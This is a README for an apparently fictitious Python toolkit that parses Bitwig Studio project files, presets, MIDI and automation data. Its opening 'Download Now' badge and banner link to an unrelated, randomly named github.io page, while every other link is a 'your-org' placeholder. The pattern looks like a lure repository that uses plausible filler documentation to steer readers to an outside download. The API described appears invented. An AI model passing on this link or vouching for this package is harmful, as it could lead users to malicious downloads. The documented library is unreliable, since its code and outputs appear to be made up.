# bitwig-studio-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://MMartins100.github.io/bitwig-page-23u/)


[![Banner](banner.png)](https://MMartins100.github.io/bitwig-page-23u/)


[![PyPI version](https://badge.fury.io/py/bitwig-studio-toolkit.svg)](https://badge.fury.io/py/bitwig-studio-toolkit)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform: Windows](https://img.shields.io/badge/platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![Tests](https://img.shields.io/badge/tests-passing-brightgreen.svg)](https://github.com/your-org/bitwig-studio-toolkit/actions)

A Python toolkit for parsing, analyzing, and automating workflows around **Bitwig Studio** project files on Windows. Built for producers, developers, and audio engineers who want programmatic access to `.bwproject` data, MIDI content, and preset management.

> **Note:** This toolkit works with existing Bitwig Studio installations. It does not distribute, modify, or replace Bitwig Studio itself. A licensed copy of Bitwig Studio for Windows is required.

---

## 📋 Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Requirements](#requirements)
- [Contributing](#contributing)
- [License](#license)

---

## ✨ Features

- **Project File Parsing** — Read and inspect `.bwproject` files without opening Bitwig Studio
- **MIDI Data Extraction** — Extract note events, velocities, CC automation, and clip metadata from project tracks
- **Preset Management** — Scan, index, and organize `.bwpreset` files across your user library
- **Automation Lane Analysis** — Read automation curves and export them to standard formats (JSON, CSV)
- **Track Metadata Export** — Dump track names, signal chains, and device references to structured data
- **Batch Project Processing** — Process multiple Bitwig Studio project files in a single pipeline run
- **Windows Path Integration** — Automatically resolves Bitwig Studio's default library and project directories on Windows
- **Plugin Reference Inventory** — List all VST/VST3 and Bitwig native devices referenced in a project

---

## 🚀 Installation

### From PyPI

```bash
pip install bitwig-studio-toolkit
```

### From Source

```bash
git clone https://github.com/your-org/bitwig-studio-toolkit.git
cd bitwig-studio-toolkit
pip install -e ".[dev]"
```

### Optional Dependencies

```bash
# For MIDI export support
pip install bitwig-studio-toolkit[midi]

# For visualization features (automation curve plotting)
pip install bitwig-studio-toolkit[viz]

# Install everything
pip install bitwig-studio-toolkit[all]
```

---

## ⚡ Quick Start

```python
from bitwig_toolkit import BitwigProject

# Load a Bitwig Studio project file
project = BitwigProject.load("C:/Users/YourName/Bitwig Studio/Projects/my_track.bwproject")

# Print basic project info
print(project.name)           # "my_track"
print(project.tempo)          # 128.0
print(project.time_signature) # (4, 4)
print(f"Tracks: {len(project.tracks)}")

# Iterate over tracks
for track in project.tracks:
    print(f"  [{track.type}] {track.name} — {len(track.clips)} clip(s)")
```

**Output:**
```
my_track
128.0
(4, 4)
Tracks: 6
  [instrument] Kick Layer     — 4 clip(s)
  [instrument] Bass Synth     — 2 clip(s)
  [audio]      Vocal Chop     — 3 clip(s)
  [fx]         Master FX Bus  — 0 clip(s)
```

---

## 📖 Usage Examples

### Extracting MIDI Note Data

```python
from bitwig_toolkit import BitwigProject
from bitwig_toolkit.midi import MidiExporter

project = BitwigProject.load("my_track.bwproject")

# Find all instrument tracks with MIDI clips
for track in project.tracks.filter(type="instrument"):
    for clip in track.clips:
        notes = clip.get_midi_notes()
        print(f"\nClip: '{clip.name}' on track '{track.name}'")
        print(f"  Duration: {clip.length_bars} bars")
        print(f"  Note count: {len(notes)}")

        for note in notes[:5]:  # Show first 5 notes
            print(f"    Pitch={note.pitch:3d}  Vel={note.velocity:3d}  "
                  f"Start={note.start_beats:.2f}  Dur={note.duration_beats:.2f}")

# Export all MIDI clips to standard .mid files
exporter = MidiExporter(project)
exporter.export_all(output_dir="C:/exports/midi/", flatten=False)
print("MIDI export complete.")
```

---

### Managing Bitwig Studio Presets

```python
from bitwig_toolkit.presets import PresetLibrary

# Initialize the library scanner using Bitwig Studio's default Windows path
library = PresetLibrary.from_default_windows_path()
# Equivalent to: PresetLibrary("C:/Users/<name>/Documents/Bitwig Studio/Library/Presets")

# Scan and index all presets
library.scan()
print(f"Found {library.count} presets across {len(library.categories)} categories")

# Search by device type
synth_presets = library.query(device="Polymer", tags=["bass", "dark"])
for preset in synth_presets:
    print(f"  {preset.name:<30} {preset.category:<20} {preset.path}")

# Export preset index to JSON for external tools
library.export_index("preset_index.json")
```

---

### Automation Lane Export

```python
from bitwig_toolkit import BitwigProject
from bitwig_toolkit.automation import AutomationReader

project = BitwigProject.load("my_track.bwproject")
reader = AutomationReader(project)

# Extract all automation lanes
lanes = reader.get_all_lanes()

for lane in lanes:
    print(f"Lane: {lane.target_parameter} on '{lane.track_name}'")
    print(f"  Points: {len(lane.points)}")
    print(f"  Range:  {lane.value_min} → {lane.value_max}")

# Export a specific lane to CSV
volume_lane = reader.get_lane(track="Bass Synth", parameter="Volume")
volume_lane.to_csv("bass_volume_automation.csv")

# Or convert to a list of (time_beats, value) tuples
curve_data = volume_lane.to_list()
print(curve_data[:3])
# [(0.0, 0.85), (2.0, 0.72), (4.5, 0.91)]
```

---

### Batch Project Processing

```python
from pathlib import Path
from bitwig_toolkit import BitwigProject
from bitwig_toolkit.report import ProjectReporter

projects_dir = Path("C:/Users/YourName/Bitwig Studio/Projects")
report = ProjectReporter()

for bwproject_file in projects_dir.rglob("*.bwproject"):
    try:
        project = BitwigProject.load(bwproject_file)
        report.add(project)
        print(f"✓ Processed: {bwproject_file.name}")
    except Exception as exc:
        print(f"✗ Skipped {bwproject_file.name}: {exc}")

# Export summary report
report.to_csv("project_inventory.csv")
report.to_json("project_inventory.json")

print(f"\nSummary: {report.total_projects} projects, "
      f"{report.total_tracks} total tracks, "
      f"{report.unique_plugins} unique plugin references")
```

---

### Plugin and Device Inventory

```python
from bitwig_toolkit import BitwigProject
from bitwig_toolkit.devices import DeviceScanner

project = BitwigProject.load("my_track.bwproject")
scanner = DeviceScanner(project)

# List all devices referenced in the project
for device in scanner.all_devices():
    print(f"  [{device.vendor:<15}] {device.name:<30} format={device.format}")

# Check for missing or unresolved plugins on this Windows machine
missing = scanner.find_missing()
if missing:
    print("\n⚠ Missing plugins detected:")
    for m in missing:
        print(f"  - {m.name} ({m.format}) — not found in VST scan paths")
else:
    print("\n✓ All plugin references resolved.")
```

---

## 🔧 Requirements

| Requirement | Version | Notes |
|---|---|---|
| **Python** | 3.8 or higher | 3.11+ recommended |
| **Operating System** | Windows 10 / 11 | Primary support target |
| **Bitwig Studio** | 4.x – 5.x | Required for project files |
| `construct` | ≥ 2.10 | Binary format parsing |
| `lxml` | ≥ 4.9 | XML metadata extraction |
| `mido` | ≥ 1.3 | MIDI file read/write (`[midi]` extra) |
| `matplotlib` | ≥ 3.7 | Automation plotting (`[viz]` extra) |
| `click` | ≥ 8.1 | CLI interface |
| `pydantic` | ≥ 2.0 | Data validation and schema models |

> **macOS / Linux:** Community support only. Path resolution helpers are Windows-specific, but core parsing features are cross-platform.

---

## 🗂 Project Structure

```
bitwig-studio-toolkit/
├── bitwig_toolkit/
│   ├── __init__.py
│   ├── project.py          # BitwigProject core class
│   ├── midi.py             # MIDI extraction and export
│   ├── presets.py          # Preset library management
│   ├── automation.py       # Automation lane reader
│   ├── devices.py          # Plugin/device inventory
│   ├── report.py           # Batch reporting utilities
│   └── cli.py              # Command-line interface
├── tests/
│   ├── fixtures/           # Sample .bwproject test files
│   └── test_*.py
├── docs/
├── pyproject.toml
└── README.md
```

---

## 💻 CLI Usage

The toolkit also ships with a command-line interface:

```bash
# Show project summary
bwtoolkit info "my_track.bwproject"

# Export all MIDI clips
bwtoolkit export-midi "my_track.bwproject" --output ./midi_export/

# Scan preset library
bwtoolkit presets scan --format table

# Batch report on a projects folder
bwtoolkit batch-report "C:/Users/YourName/Bitwig Studio/Projects" --out report.json
```

---

## 🤝 Contributing

Contributions are welcome and appreciated. Please read the [CONTRIBUTING.md](CONTRIBUTING.md) before submitting a pull request.

```bash
# Set up development environment
git clone https://github.com/your-org/bitwig-studio-toolkit.git
cd bitwig-studio-toolkit
python -m venv .venv
.venv\Scripts\activate          # Windows
pip install -e ".[dev]"

# Run tests
pytest tests/ -v

# Lint and format
black bitwig_toolkit